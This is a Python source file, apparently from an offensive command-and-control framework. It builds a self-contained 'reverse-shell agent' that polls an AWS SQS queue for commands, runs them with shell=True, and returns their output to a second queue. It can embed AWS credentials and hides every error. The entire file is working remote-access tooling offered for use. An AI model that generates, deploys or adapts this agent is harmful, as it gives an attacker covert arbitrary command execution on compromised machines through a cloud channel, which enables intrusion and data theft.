#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""AWS SQS reverse-shell agent script builder (compatible with reverse_aws_sqs listener)."""

from __future__ import annotations


def build_aws_sqs_reverse_agent_script(
    command_queue_url: str,
    response_queue_url: str,
    aws_region: str = "us-east-1",
    aws_access_key_id: str = "",
    aws_secret_access_key: str = "",
    aws_session_token: str = "",
    poll_interval: float = 2.0,
    use_base64: bool = True,
    visibility_timeout: int = 30,
) -> str:
    """Return a self-contained Python agent for listeners/aws/reverse_aws_sqs.

    Protocol:
      poll command_queue  -> base64(JSON {{command_id, command, timestamp}})
      send response_queue -> base64(JSON {{command_id, output, status, error}})
    """
    cmd_url = str(command_queue_url or "").strip()
    res_url = str(response_queue_url or "").strip()
    region = str(aws_region or "us-east-1").strip()
    key_id = str(aws_access_key_id or "")
    secret = str(aws_secret_access_key or "")
    token = str(aws_session_token or "")
    interval = float(poll_interval or 2.0)
    b64 = bool(use_base64)
    vis = int(visibility_timeout or 30)

    return f"""
import base64,json,os,subprocess,time
CMDQ={cmd_url!r}; RESQ={res_url!r}; REGION={region!r}
KEY={key_id!r}; SEC={secret!r}; TOK={token!r}
INTERVAL={interval}; USE_B64={b64}; VIS={vis}

def _run(cmd):
  try:
    p=subprocess.run(cmd,shell=True,capture_output=True,timeout=120)
    out=(p.stdout or b'')+(p.stderr or b'')
    st=p.returncode
    if not out: out=('exit %s\\n'%st).encode()
    return out.decode('utf-8','replace'), st, ''
  except Exception as e:
    return '', 1, str(e)

def _encode_body(obj):
  raw=json.dumps(obj,separators=(',',':')).encode('utf-8')
  if USE_B64:
    return base64.b64encode(raw).decode('ascii')
  return raw.decode('utf-8')

def _decode_body(body):
  if USE_B64:
    try:
      body=base64.b64decode(str(body).encode('ascii')).decode('utf-8')
    except Exception:
      pass
  return json.loads(body)

def _boto_client():
  import boto3
  kw={{'region_name':REGION}}
  if KEY and SEC:
    kw['aws_access_key_id']=KEY
    kw['aws_secret_access_key']=SEC
    if TOK: kw['aws_session_token']=TOK
  return boto3.client('sqs', **kw)

def _cli_args():
  a=['aws','--region',REGION,'sqs']
  if KEY and SEC:
    os.environ.setdefault('AWS_ACCESS_KEY_ID',KEY)
    os.environ.setdefault('AWS_SECRET_ACCESS_KEY',SEC)
    if TOK: os.environ.setdefault('AWS_SESSION_TOKEN',TOK)
  return a

def _cli_recv():
  import subprocess as sp
  args=_cli_args()+['receive-message','--queue-url',CMDQ,'--max-number-of-messages','1',
    '--wait-time-seconds','1','--visibility-timeout',str(VIS),'--output','json']
  p=sp.run(args,capture_output=True,text=True,timeout=30)
  if p.returncode!=0: return None
  data=json.loads(p.stdout or '{{}}')
  msgs=data.get('Messages') or []
  return msgs[0] if msgs else None

def _cli_delete(handle):
  import subprocess as sp
  args=_cli_args()+['delete-message','--queue-url',CMDQ,'--receipt-handle',handle]
  sp.run(args,capture_output=True,text=True,timeout=20)

def _cli_send(body):
  import subprocess as sp
  args=_cli_args()+['send-message','--queue-url',RESQ,'--message-body',body]
  sp.run(args,capture_output=True,text=True,timeout=20)

def _poll_boto(sqs):
  resp=sqs.receive_message(
    QueueUrl=CMDQ, MaxNumberOfMessages=1, WaitTimeSeconds=1,
    VisibilityTimeout=VIS, MessageAttributeNames=['All'])
  msgs=resp.get('Messages') or []
  return msgs[0] if msgs else None

def _send_boto(sqs, body):
  sqs.send_message(QueueUrl=RESQ, MessageBody=body)

def _delete_boto(sqs, handle):
  sqs.delete_message(QueueUrl=CMDQ, ReceiptHandle=handle)

sqs=None
use_boto=True
try:
  sqs=_boto_client()
except Exception:
  use_boto=False

while True:
  try:
    msg=None
    if use_boto and sqs:
      try:
        msg=_poll_boto(sqs)
      except Exception:
        use_boto=False
        sqs=None
    if not use_boto:
      msg=_cli_recv()
    if not msg:
      time.sleep(max(0.5, INTERVAL))
      continue
    body=msg.get('Body','')
    handle=msg.get('ReceiptHandle','')
    try:
      data=_decode_body(body)
    except Exception:
      if handle:
        if use_boto and sqs: _delete_boto(sqs, handle)
        else: _cli_delete(handle)
      time.sleep(max(0.5, INTERVAL))
      continue
    cmd_id=str(data.get('command_id') or 'unknown')
    cmd=str(data.get('command') or '')
    out,st,err='',0,''
    if cmd.strip():
      out,st,err=_run(cmd)
    resp=_encode_body({{'command_id':cmd_id,'output':out,'status':st,'error':err}})
    try:
      if use_boto and sqs:
        _send_boto(sqs, resp)
        if handle: _delete_boto(sqs, handle)
      else:
        _cli_send(resp)
        if handle: _cli_delete(handle)
    except Exception:
      pass
  except Exception:
    pass
  time.sleep(max(0.5, INTERVAL))
""".strip()
